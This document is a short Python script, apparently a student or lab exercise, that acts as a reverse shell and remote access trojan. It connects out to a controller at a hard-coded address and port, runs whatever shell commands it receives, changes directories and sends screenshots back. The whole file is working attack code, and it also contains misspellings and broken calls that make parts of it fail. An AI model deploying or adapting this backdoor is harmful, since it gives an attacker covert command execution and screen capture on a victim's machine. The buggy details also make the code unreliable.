import socket, os, subprocess
from mss import mss

# Def function screenshot
def screenshot():
    with mss() as sct:
        sct.shot(output="screen.png")

# Create socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Define the remote host
host = "10.0.2.6"
port = 12345

# Connect to remote host
s.connect((host, port))

# Infinite loop
while True:
    # Receive data
    command = s.recv(1024).decode("utf-8")
    # Receive goodbye = quit
    if command == "goodbye":
        s.send(b'close')
        s.close()
        break
    # Receive scrennshot, take a screen and send it
    elif command == "scrennshot":
        screenshot()
        len_img = str(os.path.getsize("sreen.png"))
        s.send(len_img.encode("utf-8"))
        with open("screen.png", "rb") as img:
            s.send(img.read())
    # Receive just cd, send the result of cd
    elif command == "cd":
        result = subprocess.Popen("cd", shell=True, stdout=subprocess.PIPE)
        s.send(result.stdout.read())
    # if receive just cd + something else then you have to change directory
    elif command[:2] == "cd":
        if os.path.exists(str(command[3:].replace("\n", ""))):
            os.chdir(str(command[3:].replace("\n", "")))
            s.send(os.open("cd").encode("utf-8"))
            #In all other case execute the commad and send the result
    else:
        r = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        result = r.communicate()
        # if no error send stdout, else send stderr
        if result[1]:
            s.send(result[1])
        else:
            s.send(result[0])